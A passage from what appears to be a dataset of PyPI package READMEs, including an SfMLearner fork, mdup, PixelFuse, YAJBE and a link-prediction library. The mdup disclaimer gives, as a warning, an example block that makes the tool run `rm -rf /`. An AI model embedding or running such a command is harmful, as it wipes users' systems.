Once you have model trained, you can obtain the single-view depth predictions on the KITTI eigen test split formatted properly for evaluation by running
```bash
python test_kitti_depth.py --dataset_dir /path/to/raw/kitti/dataset/ --output_dir /path/to/output/directory --ckpt_file /path/to/pre-trained/model/file/
```

### Pose
We also provide sample testing code for obtaining pose predictions on the KITTI dataset with a pre-trained model. You can obtain the predictions formatted as above for pose evaluation by running
```bash
python test_kitti_pose.py --test_seq [sequence_id] --dataset_dir /path/to/KITTI/odometry/set/ --output_dir /path/to/output/directory/ --ckpt_file /path/to/pre-trained/model/file/
```
A sample model trained on 5-frame snippets can be downloaded at this [Google Drive](https://drive.google.com/file/d/1vMg9UbK4kQSvFtJrzv0lfCVAoTN-we1y/view?usp=sharing). 

Then you can obtain predictions on, say `Seq. 9`, by running
```bash
python test_kitti_pose.py --test_seq 9 --dataset_dir /path/to/KITTI/odometry/set/ --output_dir /path/to/output/directory/ --ckpt_file models/model-100280
```

## Other implementations
[Pytorch](https://github.com/ClementPinard/SfmLearner-Pytorch) (by Clement Pinard)

## Disclaimer
This is the authors' implementation of the system described in the paper and not an official Google product.
","
# Fork of SfMLearner
This fork is of SfMLearner, nothing changed with it but includes a `setup.py` file so the repo can be installed via pip using the command:
```
pip install SfMLearner-installable
```

# SfMLearner
This codebase implements the system described in the paper:

Unsupervised Learning of Depth and Ego-Motion from Video

[Tinghui Zhou](https://people.eecs.berkeley.edu/~tinghuiz/), [Matthew Brown](http://matthewalunbrown.com/research/research.html), [Noah Snavely](http://www.cs.cornell.edu/~snavely/), [David G. Lowe](http://www.cs.ubc.ca/~lowe/home.html)

In CVPR 2017 (**Oral**).

See the [project webpage](https://people.eecs.berkeley.edu/~tinghuiz/projects/SfMLearner/) for more details. Please contact Tinghui Zhou (tinghuiz@berkeley.edu) if you have any questions.



## Prerequisites
This codebase was developed and tested with Tensorflow 1.0, CUDA 8.0 and Ubuntu 16.04.

## Running the single-view depth demo
We provide the demo code for running our single-view depth prediction model. First, download the pre-trained model from this [Google Drive](https://drive.google.com/file/d/1AH5LV29Fijrz_QI3Th6ogtXJKXhd8Nm9/view?usp=sharing), and put the model files under `models/`. Then you can use the provided ipython-notebook `demo.ipynb` to run the demo.

## Preparing training data
In order to train the model using the provided code, the data needs to be formatted in a certain manner. 

For [KITTI](http://www.cvlibs.net/datasets/kitti/raw_data.php), first download the dataset using this [script](http://www.cvlibs.net/download.php?file=raw_data_downloader.zip) provided on the official website, and then run the following command
```bash
python data/prepare_train_data.py --dataset_dir=/path/to/raw/kitti/dataset/ --dataset_name='kitti_raw_eigen' --dump_root=/path/to/resulting/formatted/data/ --seq_length=3 --img_width=416 --img_height=128 --num_threads=4
```
For the pose experiments, we used the KITTI odometry split, which can be downloaded [here](http://www.cvlibs.net/datasets/kitti/eval_odometry.php). Then you can change `--dataset_name` option to `kitti_odom` when preparing the data.

For [Cityscapes](https://www.cityscapes-dataset.com/), download the following packages: 1) `leftImg8bit_sequence_trainvaltest.zip`, 2) `camera_trainvaltest.zip`. Then run the following command
```bash
python data/prepare_train_data.py --dataset_dir=/path/to/cityscapes/dataset/ --dataset_name='cityscapes' --dump_root=/path/to/resulting/formatted/data/ --seq_length=3 --img_width=416 --img_height=171 --num_threads=4
```
Notice that for Cityscapes the `img_height` is set to 171 because we crop out the bottom part of the image that contains the car logo, and the resulting image will have height 128.

## Training
Once the data are formatted following the above instructions, you should be able to train the model by running the following command
```bash
python train.py --dataset_dir=/path/to/the/formatted/data/ --checkpoint_dir=/where/to/store/checkpoints/ --img_width=416 --img_height=128 --batch_size=4
```
You can then start a `tensorboard` session by
```bash
tensorboard --logdir=/path/to/tensorflow/log/files --port=8888
```
and visualize the training progress by opening [https://localhost:8888](https://localhost:8888) on your browser. If everything is set up properly, you should start seeing reasonable depth prediction after ~100K iterations when training on KITTI. 

### Notes
After adding data augmentation and removing batch normalization (along with some other minor tweaks), we have been able to train depth models better than what was originally reported in the paper even without using additional Cityscapes data or the explainability regularization. The provided pre-trained model was trained on KITTI only with smooth weight set to 0.5, and achieved the following performance on the Eigen test split (Table 1 of the paper):

| Abs Rel | Sq Rel | RMSE  | RMSE(log) | Acc.1 | Acc.2 | Acc.3 |
|---------|--------|-------|-----------|-------|-------|-------|
| 0.183   | 1.595  | 6.709 | 0.270     | 0.734 | 0.902 | 0.959 | 

When trained on 5-frame snippets, the pose model obtains the following performanace on the KITTI odometry split (Table 3 of the paper):

| Seq. 09            | Seq. 10            |
|--------------------|--------------------|
| 0.016 (std. 0.009) | 0.013 (std. 0.009) |

## Evaluation on KITTI

### Depth
We provide evaluation code for the single-view depth experiment on KITTI. First, download our predictions (~140MB) from this [Google Drive](https://drive.google.com/file/d/1ERB2vUH_6to8NI9KN-ug-ijcWaQf9SIp/view?usp=sharing) and put them into `kitti_eval/`.

Then run
```bash
python kitti_eval/eval_depth.py --kitti_dir=/path/to/raw/kitti/dataset/ --pred_file=kitti_eval/kitti_eigen_depth_predictions.npy
```
If everything runs properly, you should get the numbers for `Ours(CS+K)` in Table 1 of the paper. To get the numbers for `Ours cap 50m (CS+K)`, set an additional flag `--max_depth=50` when executing the above command.

### Pose
We provide evaluation code for the pose estimation experiment on KITTI. First, download the predictions and ground-truth pose data from this [Google Drive](https://drive.google.com/file/d/1BqTIY_PBRkFvKrFvqlhPsEaouSdo42ZZ/view?usp=sharing).

Notice that all the predictions and ground-truth are 5-frame snippets with the format of `timestamp tx ty tz qx qy qz qw` consistent with the [TUM evaluation toolkit](https://vision.in.tum.de/data/datasets/rgbd-dataset/tools#evaluation). Then you could run 
```bash
python kitti_eval/eval_pose.py --gtruth_dir=/directory/of/groundtruth/trajectory/files/ --pred_dir=/directory/of/predicted/trajectory/files/
```
to obtain the results reported in Table 3 of the paper. For instance, to get the results of `Ours` for `Seq. 10` you could run
```bash
python kitti_eval/eval_pose.py --gtruth_dir=kitti_eval/pose_data/ground_truth/10/ --pred_dir=kitti_eval/pose_data/ours_results/10/
```

## KITTI Testing code

### Depth
Once you have model trained, you can obtain the single-view depth predictions on the KITTI eigen test split formatted properly for evaluation by running
```bash
python test_kitti_depth.py --dataset_dir /path/to/raw/kitti/dataset/ --output_dir /path/to/output/directory --ckpt_file /path/to/pre-trained/model/file/
```

### Pose
We also provide sample testing code for obtaining pose predictions on the KITTI dataset with a pre-trained model. You can obtain the predictions formatted as above for pose evaluation by running
```bash
python test_kitti_pose.py --test_seq [sequence_id] --dataset_dir /path/to/KITTI/odometry/set/ --output_dir /path/to/output/directory/ --ckpt_file /path/to/pre-trained/model/file/
```
A sample model trained on 5-frame snippets can be downloaded at this [Google Drive](https://drive.google.com/file/d/1vMg9UbK4kQSvFtJrzv0lfCVAoTN-we1y/view?usp=sharing). 

Then you can obtain predictions on, say `Seq. 9`, by running
```bash
python test_kitti_pose.py --test_seq 9 --dataset_dir /path/to/KITTI/odometry/set/ --output_dir /path/to/output/directory/ --ckpt_file models/model-100280
```

## Other implementations
[Pytorch](https://github.com/ClementPinard/SfmLearner-Pytorch) (by Clement Pinard)

## Disclaimer
This is the authors' implementation of the system described in the paper and not an official Google product.
",topher097/sfmlearner_installable
mdup,https://github.com/alexandru-dinu/mdup,0,2836,2595,"# `mdup`

[![Build](https://github.com/alexandru-dinu/mdup/actions/workflows/main.yml/badge.svg)](https://github.com/alexandru-dinu/mdup/actions/workflows/main.yml)
[![PyPI version](https://badge.fury.io/py/mdup.svg)](https://pypi.org/project/mdup/)

`mdup` is a command-line tool for keeping markdown files up-to-date by injecting code, script or command output between special blocks. One immediate use case is keeping documentation up-to-date without having to manually update markdown files with info from code snippets, scripts or command outputs [^1].

`mdup` does not depend on anything apart from Python stdlib.

## Install

```
pip install mdup
```

## Usage
<!-- MDUP:BEG (CMD:poetry run mdup --help) -->
```
usage: mdup [-h] -i INPUT [-o OUTPUT] [-v]

options:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        input markdown file
  -o OUTPUT, --output OUTPUT
                        output markdown file; if not specified, the input file
                        will be edited in place
  -v, --version         show program's version number and exit
```
<!-- MDUP:END -->

Running `mdup -i <input.md> -o <output.md>` will replace the contents between each block
given the appropriate action kind (see details below). This means that you can keep files up-to-date by simply rerunning `mdup`.

Omitting the `-o` option will edit the file in-place.

For example, the command-line usage block above is automatically generated by defining:

    <!-- MDUP:BEG (CMD:poetry run mdup --help) -->
    <!-- MDUP:END -->

then running `mdup -i README.md` which executes `poetry run mdup --help`.

## How does it work?

The blocks are defined using HTML comments.
Specifically, the **begin** block is of the form:

    <!-- MDUP:BEG ({KIND}:{CONTENTS}) -->

where `{KIND}` can be either:
- `SRC`: to just include the contents of `{CONTENTS}`, e.g. from a path
- `RUN`: to execute the script from `{CONTENTS}` and inject its stdout in the block
- `CMD`: to execute the command from `{CONTENTS}` and inject its stdout in the block

For `SRC` and `RUN` commands, the `{CONTENTS}` must be a path, relative to the md file.

The blocks must be defined as the sole contents of the line, i.e. matching `^` and `$` anchors.

## Examples

For examples, see [tests](./tests/).

## ⚠️ Disclaimer

I created this tool primarily to meet my own needs -- it's very simple and ad-hoc. While I don't anticipate it gaining too much adoption, always beware when running `mdup` on markdown files of unknown origin (which can be malicious), e.g.:

    <!-- MDUP:BEG (CMD:rm -rf /) -->
    <!-- MDUP:END -->

This tool should only be used for **simple** tasks, e.g. keeping **simple** documentation up-to-date.

[^1]: Inspired by [DavidWells/markdown-magic](https://github.com/DavidWells/markdown-magic).
","# `mdup`

[![Build](https://github.com/alexandru-dinu/mdup/actions/workflows/main.yml/badge.svg)](https://github.com/alexandru-dinu/mdup/actions/workflows/main.yml)
[![PyPI version](https://badge.fury.io/py/mdup.svg)](https://pypi.org/project/mdup/)

`mdup` is a command-line tool for keeping markdown files up-to-date by injecting code, script or command output between special blocks. One immediate use case is keeping documentation up-to-date without having to manually update markdown files with info from code snippets, scripts or command outputs [^1].

`mdup` does not depend on anything apart from Python stdlib.

## Install

```
pip install mdup
```

## Usage

```
usage: mdup [-h] -i INPUT [-o OUTPUT] [-v]

options:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        input markdown file
  -o OUTPUT, --output OUTPUT
                        output markdown file; if not specified, the input file
                        will be edited in place
  -v, --version         show program's version number and exit
```


Running `mdup -i  -o ` will replace the contents between each block
given the appropriate action kind (see details below). This means that you can keep files up-to-date by simply rerunning `mdup`.

Omitting the `-o` option will edit the file in-place.

For example, the command-line usage block above is automatically generated by defining:

    


then running `mdup -i README.md` which executes `poetry run mdup --help`.

## How does it work?

The blocks are defined using HTML comments.
Specifically, the **begin** block is of the form:

    

where `{KIND}` can be either:
- `SRC`: to just include the contents of `{CONTENTS}`, e.g. from a path
- `RUN`: to execute the script from `{CONTENTS}` and inject its stdout in the block
- `CMD`: to execute the command from `{CONTENTS}` and inject its stdout in the block

For `SRC` and `RUN` commands, the `{CONTENTS}` must be a path, relative to the md file.

The blocks must be defined as the sole contents of the line, i.e. matching `^` and `$` anchors.

## Examples

For examples, see [tests](./tests/).

## ⚠️ Disclaimer

I created this tool primarily to meet my own needs -- it's very simple and ad-hoc. While I don't anticipate it gaining too much adoption, always beware when running `mdup` on markdown files of unknown origin (which can be malicious), e.g.:

    


This tool should only be used for **simple** tasks, e.g. keeping **simple** documentation up-to-date.

[^1]: Inspired by [DavidWells/markdown-magic](https://github.com/DavidWells/markdown-magic).
",alexandru-dinu/mdup
pqam-dparamhu2021,https://github.com/amkrajewski/pqam-dparamhu2021,2,2994,2994,"# PyQAlloy-compatible Model for D Parameter prediction based on Hu2021

This repository contains a PyQAlloy-compatible compositionalModel for D Parameter Prediction Based on Yong-Jie Hu 2021 (10.1016/j.actamat.2021.116800) that 
accepts a chemical formula of an alloy or a pymatgen Composition object and returns the predicted Genralized Stacking Fault Energy (GSF), Surface Energy (Surf), and the 
calculated D Parameter.

## Install and use

To run this model you will need **Python 3.9+** and **R 4.1.0+** installed on your system. If you have them, you can simply with:
    
    pip install pqam_dparamhu2021

Then, use should be as simple as:

    import pqam_dparamhu2021
    
    print(pqam_dparamhu2021.predict(""W30 Mo25 Ta45""))


## Attribution

This repository has been created by Adam M. Krajewski (https://orcid.org/0000-0002-2266-0099) and is licensed under the MIT License. 
**Please cite this repository if you use it in your work.**

The featurizer and predictive model (HEA_pred.R and dependencies) have been optimized across and re-styled by Adam M.
Krajewski based on code originally developed by Young-Jie Hu (https://orcid.org/0000-0003-1500-4015) et al. for their
journal publication and published in Materials Commons at https://doi.org/10.13011/m3-rkg0-zh65, where original code
can be accessed,  distributed under ODC Open Database License (ODbL) v1.0. **Please cite this publication as well:** 
- Yong-Jie Hu, Aditya Sundar, Shigenobu Ogata, Liang Qi, Screening of generalized stacking fault energies, 
surface energies and intrinsic ductile potency of refractory multicomponent alloys, Acta Materialia, 
Volume 210, 2021, 116800, https://doi.org/10.1016/j.actamat.2021.116800

The gbm-locfit package (Gradient Boosting Machine-Locfit: A GBM framework using local regresssion via Locfit) has been 
developed by Materials Project in 2016 and is distributed under the terms of the MIT License. Details can be found in
its code.


## Hu's README File

Hello, thank you for your interest in our work!
Here we provide a script written in R language to take an alloy composition of interest and correspondingly predict the GSF energy, surface energy, and the ductility parameter based on the SL models in our manuscript ( https://doi.org/10.1016/j.actamat.2021.116800)
To run the script and make predictions, you need to:
1)	Download the RStudio platform. (https://www.rstudio.com/) ## No worry, it is open access 😊
2)	Put all the files you downloaded from Materials Commons (basically all our files) into one local folder
3)	Open the “predict.R” file in RStudio, input the alloy composition there, execute every line there, and the prediction will jump out in the console window below. 

Please contact qiliang@umich.edu or yh593@drexel.edu if you have any questions. 

P.S.,
“predict_screen_4nary_all.csv” is the original data for plotting Figure 7&8 in the manuscript. Other figures in the manuscript can be reproduced by the data listed in the tables in the manuscript.
","# PyQAlloy-compatible Model for D Parameter prediction based on Hu2021

This repository contains a PyQAlloy-compatible compositionalModel for D Parameter Prediction Based on Yong-Jie Hu 2021 (10.1016/j.actamat.2021.116800) that 
accepts a chemical formula of an alloy or a pymatgen Composition object and returns the predicted Genralized Stacking Fault Energy (GSF), Surface Energy (Surf), and the 
calculated D Parameter.

## Install and use

To run this model you will need **Python 3.9+** and **R 4.1.0+** installed on your system. If you have them, you can simply with:
    
    pip install pqam_dparamhu2021

Then, use should be as simple as:

    import pqam_dparamhu2021
    
    print(pqam_dparamhu2021.predict(""W30 Mo25 Ta45""))


## Attribution

This repository has been created by Adam M. Krajewski (https://orcid.org/0000-0002-2266-0099) and is licensed under the MIT License. 
**Please cite this repository if you use it in your work.**

The featurizer and predictive model (HEA_pred.R and dependencies) have been optimized across and re-styled by Adam M.
Krajewski based on code originally developed by Young-Jie Hu (https://orcid.org/0000-0003-1500-4015) et al. for their
journal publication and published in Materials Commons at https://doi.org/10.13011/m3-rkg0-zh65, where original code
can be accessed,  distributed under ODC Open Database License (ODbL) v1.0. **Please cite this publication as well:** 
- Yong-Jie Hu, Aditya Sundar, Shigenobu Ogata, Liang Qi, Screening of generalized stacking fault energies, 
surface energies and intrinsic ductile potency of refractory multicomponent alloys, Acta Materialia, 
Volume 210, 2021, 116800, https://doi.org/10.1016/j.actamat.2021.116800

The gbm-locfit package (Gradient Boosting Machine-Locfit: A GBM framework using local regresssion via Locfit) has been 
developed by Materials Project in 2016 and is distributed under the terms of the MIT License. Details can be found in
its code.


## Hu's README File

Hello, thank you for your interest in our work!
Here we provide a script written in R language to take an alloy composition of interest and correspondingly predict the GSF energy, surface energy, and the ductility parameter based on the SL models in our manuscript ( https://doi.org/10.1016/j.actamat.2021.116800)
To run the script and make predictions, you need to:
1)	Download the RStudio platform. (https://www.rstudio.com/) ## No worry, it is open access 😊
2)	Put all the files you downloaded from Materials Commons (basically all our files) into one local folder
3)	Open the “predict.R” file in RStudio, input the alloy composition there, execute every line there, and the prediction will jump out in the console window below. 

Please contact qiliang@umich.edu or yh593@drexel.edu if you have any questions. 

P.S.,
“predict_screen_4nary_all.csv” is the original data for plotting Figure 7&8 in the manuscript. Other figures in the manuscript can be reproduced by the data listed in the tables in the manuscript.
",amkrajewski/pqam-dparamhu2021
pixelfuse,https://github.com/TheTS-labs/PixelFuse,4,4822,4822,"# 📄🔄🎞️ PixelFuse

Convert any file to video and video to file.

**WARNING: videos created from files are extremely fragile**

## 💿 Installation

* Set up using `pip`:
```bash
pip install pixelfuse
```
* Install from `Git`:
```bash
pip install git+https://github.com/TheTS-labs/PixelFuse.git
```

## 🎬 Usage

### Convert file to video(`fileToVideo`)

To convert a file into a video just write the following command:
```bash
python -m pixelfuse fileToVideo ""test/example.text.txt""
```

Where [""test/example.text.txt""](./test/example.text.txt) the file you want to convert to video

As output you get the file `output.avi` - video 640x480, 1.0 FPS, codec HFYU [like this](https://drive.google.com/file/d/1OTZ9rF-6SI73BiLEwY4gJeJ2RVddLsfn/edit)

As for the parameters:
* `path: Path` - mandatory, the path to the file you want to convert
* `fps: float` - frame rate, default is `1.0`
* `width: int` - Video length, default is `480px`
* `height: int` - Video height, `640px` by default
* `fourcc: str` - Codec, a string of 4 characters, **WARNING: Use lossless codecs ONLY**, default is ""`HFYU`"".
* `output: Path` - Path to output file, default is ""`output.avi`"", **note you need to use file extension compatible with codec, for example if you use `HFYU` codec you can NOT specify `output` as `output.mp4`**
* `verbose: int` - Output level, from 0 to 3, default is 2

### 🆕 Convert files to video(`filesToVideo`)

To convert a file into a video just write the following command:
```bash
python -m pixelfuse filesToVideo ""test/example.text.txt"" ""test/example.image.jpg""
```

Where [""test/example.text.txt""](./test/example.text.txt) and [""test/example.image.jpg""](./test/example.image.jpg) the files you want to convert to video

This command will create a tar.gz archive which will later convert to a video, and delete the archive

This command will also create a hash map in which it will write the hash of **each** file. Then `convertToFile` unpacks all files and checks them according to this map

As output you get the file `output.avi` - video 640x480, 1.0 FPS, codec HFYU [like this](https://drive.google.com/file/d/1OTZ9rF-6SI73BiLEwY4gJeJ2RVddLsfn/edit)

As for the parameters:
* `paths: list[Path]` - mandatory, the paths to the files you want to convert
* `fps: float` - frame rate, default is `1.0`
* `width: int` - Video length, default is `480px`
* `height: int` - Video height, `640px` by default
* `fourcc: str` - Codec, a string of 4 characters, **WARNING: Use lossless codecs ONLY**, default is ""`HFYU`"".
* `output: Path` - Path to output file, default is ""`output.avi`"", **note you need to use file extension compatible with codec, for example if you use `HFYU` codec you can NOT specify `output` as `output.mp4`**
* `verbose: int` - Output level, from 0 to 3, default is 2

### Convert video to file(`videoToFile`)

To get your file(s) back now you need to use this command:
```bash
python -m pixelfuse videoToFile ""test/example.video.avi""
```

Where [""test/example.video.avi""](./test/example.video.avi) is the video you want to convert into file(s)

As output, you will get the file with the name it was converted into a video. For example, if you converted the file ""example.image.jpg"", when you convert the video back to a file you get a file named example.image.jpg

Or a folder with files, if you converted several files. By default, the folder name is the name of the video file without path or extension, but you can specify something else with the `exctractDir` parameter

Regarding the parameters:
* `path: Path` - Mandatory, the path to the video you want to convert back to a file
* `verbose: int` - Output level, from 0 to 2, default is 2
* `exctractDir: str` - Path to extract archive files

## ⚠️ Warning

Because of the way this converter works, the video output is **very, very** fragile

In order for you to be able to convert the file back, every pixel **MUST remain unchanged**, that is what you should avoid:
* Use ONLY lossless codecs, as all other codecs corrupt the pixels. E.g. FFMPEG `FFV1`, Huffman `HFYU`, Lagarith `LAGS`, etc.
* Do not convert videos to other formats, as this will most likely cause pixel damage
* Keep in mind that if you upload videos to YouTube, it will re-encode the video(and, guess what, damage the pixels), so if you want to download videos from YouTube, you'll need to use [Google Takeout](https://takeout.google.com/)
* Do not trim the video, it will trim some of the information, and therefore the file you converted
* Do not apply filters to the video, for example. Anything that can change pixels will damage the file and you won't be able to decode it
* Never convert zip archives, for some unknown reason the decoder (or encoder) cannot handle these archives properly, if you want to convert multiple files you better use the `filesToVideo` command

","# 📄🔄🎞️ PixelFuse

Convert any file to video and video to file.

**WARNING: videos created from files are extremely fragile**

## 💿 Installation

* Set up using `pip`:
```bash
pip install pixelfuse
```
* Install from `Git`:
```bash
pip install git+https://github.com/TheTS-labs/PixelFuse.git
```

## 🎬 Usage

### Convert file to video(`fileToVideo`)

To convert a file into a video just write the following command:
```bash
python -m pixelfuse fileToVideo ""test/example.text.txt""
```

Where [""test/example.text.txt""](./test/example.text.txt) the file you want to convert to video

As output you get the file `output.avi` - video 640x480, 1.0 FPS, codec HFYU [like this](https://drive.google.com/file/d/1OTZ9rF-6SI73BiLEwY4gJeJ2RVddLsfn/edit)

As for the parameters:
* `path: Path` - mandatory, the path to the file you want to convert
* `fps: float` - frame rate, default is `1.0`
* `width: int` - Video length, default is `480px`
* `height: int` - Video height, `640px` by default
* `fourcc: str` - Codec, a string of 4 characters, **WARNING: Use lossless codecs ONLY**, default is ""`HFYU`"".
* `output: Path` - Path to output file, default is ""`output.avi`"", **note you need to use file extension compatible with codec, for example if you use `HFYU` codec you can NOT specify `output` as `output.mp4`**
* `verbose: int` - Output level, from 0 to 3, default is 2

### 🆕 Convert files to video(`filesToVideo`)

To convert a file into a video just write the following command:
```bash
python -m pixelfuse filesToVideo ""test/example.text.txt"" ""test/example.image.jpg""
```

Where [""test/example.text.txt""](./test/example.text.txt) and [""test/example.image.jpg""](./test/example.image.jpg) the files you want to convert to video

This command will create a tar.gz archive which will later convert to a video, and delete the archive

This command will also create a hash map in which it will write the hash of **each** file. Then `convertToFile` unpacks all files and checks them according to this map

As output you get the file `output.avi` - video 640x480, 1.0 FPS, codec HFYU [like this](https://drive.google.com/file/d/1OTZ9rF-6SI73BiLEwY4gJeJ2RVddLsfn/edit)

As for the parameters:
* `paths: list[Path]` - mandatory, the paths to the files you want to convert
* `fps: float` - frame rate, default is `1.0`
* `width: int` - Video length, default is `480px`
* `height: int` - Video height, `640px` by default
* `fourcc: str` - Codec, a string of 4 characters, **WARNING: Use lossless codecs ONLY**, default is ""`HFYU`"".
* `output: Path` - Path to output file, default is ""`output.avi`"", **note you need to use file extension compatible with codec, for example if you use `HFYU` codec you can NOT specify `output` as `output.mp4`**
* `verbose: int` - Output level, from 0 to 3, default is 2

### Convert video to file(`videoToFile`)

To get your file(s) back now you need to use this command:
```bash
python -m pixelfuse videoToFile ""test/example.video.avi""
```

Where [""test/example.video.avi""](./test/example.video.avi) is the video you want to convert into file(s)

As output, you will get the file with the name it was converted into a video. For example, if you converted the file ""example.image.jpg"", when you convert the video back to a file you get a file named example.image.jpg

Or a folder with files, if you converted several files. By default, the folder name is the name of the video file without path or extension, but you can specify something else with the `exctractDir` parameter

Regarding the parameters:
* `path: Path` - Mandatory, the path to the video you want to convert back to a file
* `verbose: int` - Output level, from 0 to 2, default is 2
* `exctractDir: str` - Path to extract archive files

## ⚠️ Warning

Because of the way this converter works, the video output is **very, very** fragile

In order for you to be able to convert the file back, every pixel **MUST remain unchanged**, that is what you should avoid:
* Use ONLY lossless codecs, as all other codecs corrupt the pixels. E.g. FFMPEG `FFV1`, Huffman `HFYU`, Lagarith `LAGS`, etc.
* Do not convert videos to other formats, as this will most likely cause pixel damage
* Keep in mind that if you upload videos to YouTube, it will re-encode the video(and, guess what, damage the pixels), so if you want to download videos from YouTube, you'll need to use [Google Takeout](https://takeout.google.com/)
* Do not trim the video, it will trim some of the information, and therefore the file you converted
* Do not apply filters to the video, for example. Anything that can change pixels will damage the file and you won't be able to decode it
* Never convert zip archives, for some unknown reason the decoder (or encoder) cannot handle these archives properly, if you want to convert multiple files you better use the `filesToVideo` command

",thets-labs/pixelfuse
yajbe,https://github.com/matteobertozzi/yajbe-data-format,0,1210,1210,"# YAJBE for Python

YAJBE is a compact binary data format built to be a drop-in replacement for JSON (JavaScript Object Notation).


## Motivation for a new format
We have a lot of services exchanging or storing data using JSON, and most of them don't want to switch to a data format that requires a schema.

We wanted to remove the overhead of the JSON format (especially field names), but keeping the same data model flexibility (numbers, strings, arrays, maps/objects, and a few values such as false, true, and null).

See more at https://github.com/matteobertozzi/yajbe-data-format

### Install the package
You can find the package at https://pypi.org/project/yajbe. \
Python >=3.10 is required. To install or upgrade you can use:
```bash
$ pip install --upgrade yajbe
```

## Usage

```python
import yajbe

# encode and decode from bytes
enc = yajbe.encode_as_bytes({'a': 10, 'b': ['hello', 10]})
dec = yajbe.decode_bytes(enc)
print(dec)

# encode directly to a stream
with open('test.yajbe', 'wb') as fd:
  yajbe.encode_to_stream(fd, {'a': 10, 'b': ['hello', 10]})

# decode directly from a stream
with open('test.yajbe', 'rb') as fd:
  print(yajbe.decode_stream(fd)) # {'a': 10, 'b': ['hello', 10]}
```
","# YAJBE for Python

YAJBE is a compact binary data format built to be a drop-in replacement for JSON (JavaScript Object Notation).


## Motivation for a new format
We have a lot of services exchanging or storing data using JSON, and most of them don't want to switch to a data format that requires a schema.

We wanted to remove the overhead of the JSON format (especially field names), but keeping the same data model flexibility (numbers, strings, arrays, maps/objects, and a few values such as false, true, and null).

See more at https://github.com/matteobertozzi/yajbe-data-format

### Install the package
You can find the package at https://pypi.org/project/yajbe. \
Python >=3.10 is required. To install or upgrade you can use:
```bash
$ pip install --upgrade yajbe
```

## Usage

```python
import yajbe

# encode and decode from bytes
enc = yajbe.encode_as_bytes({'a': 10, 'b': ['hello', 10]})
dec = yajbe.decode_bytes(enc)
print(dec)

# encode directly to a stream
with open('test.yajbe', 'wb') as fd:
  yajbe.encode_to_stream(fd, {'a': 10, 'b': ['hello', 10]})

# decode directly from a stream
with open('test.yajbe', 'rb') as fd:
  print(yajbe.decode_stream(fd)) # {'a': 10, 'b': ['hello', 10]}
```
",matteobertozzi/yajbe-data-format
complex-network-link-prediction,https://github.com/Typing-Monkeys/social-network-link-prediction,0,5629,5102,"# **Complex Network Link Prediction**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) <!-- [![PyPi](https://badge.fury.io/py/nomepacchetto.svg)](https://badge.fury.io/py/nomepacchetto) --> <!-- [![Downloads](https://pepy.tech/badge/nomepacchetto/month)](https://pepy.tech/project/nomepacchetto) --> [![Wiki](https://img.shields.io/badge/howTo-Wiki-blue.svg)](https://github.com/Typing-Monkeys/social-network-link-prediction/wiki) [![GitHubIssues](https://img.shields.io/badge/issue_tracking-github-blue.svg)](https://github.com/Typing-Monkeys/social-network-link-prediction/issues) [![GitTutorial](https://img.shields.io/badge/PR-Welcome-%23FF8300.svg?)](https://git-scm.com/book/en/v2/GitHub-Contributing-to-a-Project)


#### **Complex Network Link Prediction** is a python library that implements some of the main techniques and algorithms to perform link predictions.


Check out our [home page](docs link)link pages qui for more information.

<img src=""https://raw.githubusercontent.com/Typing-Monkeys/social-network-link-prediction/develop/imgs/logo.png"" alt=""logo"" width=""70%"" />

This library implemented in python allows you to use some of the main algorithms and methods to perform link predictions. It was designed to carry out these tasks in **Complex Networks** and, specifically, in **Social Networks**. Each method has its own specific documentation available on the following page ---- where it is possible to see the required parameters and the output of the method itself. <br>
The methods are distinguished by belonging to categories and subcategories, below is an example image with all the categories.

<img src=""https://raw.githubusercontent.com/Typing-Monkeys/social-network-link-prediction/develop/imgs/methods_list.jpg"" alt=""methods list"" width=""50%"" />

The speed of computation differs both from the type of method and from the input graph. However, for convention and efficiency we have chosen to use the `csr_matrix` sparse matrix structure from the ***scipy*** library in each algorithm.


## Install
```
pip install cnlp
```

<hr>


## How to use
```python
import networkx as nx
import matplotlib.pyplot as plt
from cnlp.utils import to_adjacency_matrix
from cnlp.probabilistich_methods import stochastic_block_model

G = nx.karate_club_graph()
A = to_adjacency_matrix(G)

res = stochastic_block_model(G, 10)

predicted_edges = []
for u in range(res.shape[0]):
    for v in range(u + 1, res.shape[1]):
        if G.has_edge(u, v):
            continue
        w = res[u, v]
        predicted_edges.append((u, v, w))

# Sort the predicted edges by weight in descending order
predicted_edges.sort(key=lambda x: x[2], reverse=True)

# Print the predicted edges with their weight score
print(""Top Predicted edges:"")
for edge in predicted_edges[:50]:
    print(f""({edge[0]}, {edge[1]}): {edge[2]}"")

nx.draw(G)
plt.show()
```

<hr>

### Contribute 💥
As there are still many methods to implement and, at the same time, maintaining a library takes up a lot of time, we are always happy to accept new willing and able people to contribute and support our project.

If you want to contribute or you've found a bug, you can open a **Pull Request**.

Check this [tutorial](#https://github.com/Typing-Monkeys/social-network-link-prediction/wiki/monkeflow-Workflow-🦍) if you want to use our preferred *Workflow* 🦍 for developing.

Otherwise you can open a normal Pull Request using `git` and help us to make this project even better!

### Help ❓
If you encounter any bug or you have some problem with this package you can open an [issue](#https://github.com/Typing-Monkeys/social-network-link-prediction/wiki/monkeflow-Workflow-🦍) to report it, we will resolve that asap.

<hr>

### Building From Source
???

### Dependencies
If your system does not have some or all of this requirements they will be installed during the istallation of this library
- networkx
- scipy
- numpy
ecc

<hr>

## References

- ***Ajay Kumar, Shashank Sheshar Singh, Kuldeep Singh, Bhaskar Biswas. 2020.***
    [Link prediction techniques, applications, and performance: A survey](https://www.sciencedirect.com/science/article/pii/S0378437120300856)
    *Physica A: Statistical Mechanics and its Applications*,
    ISSN 0378-4371, https://doi.org/10.1016/j.physa.2020.124289.
- ***David Liben-Nowell and Jon Kleinberg. 2003.***
    [The link prediction problem for social networks](https://dl.acm.org/doi/10.1145/956863.956972)
    *In Proceedings of the twelfth international conference on Information and knowledge management (CIKM '03). Association for Computing Machinery, New York, NY, USA*, 556–559, https://doi.org/10.1145/956863.956972.
- ***Víctor Martínez, Fernando Berzal, and Juan-Carlos Cubero. 2016.***
    [A Survey of Link Prediction in Complex Networks](https://dl.acm.org/doi/10.1145/3012704)
    *ACM Comput. Surv. 49, 4, Article 69 (December 2017), 33 pages*. https://doi.org/10.1145/3012704

<hr>

### ***Authors***

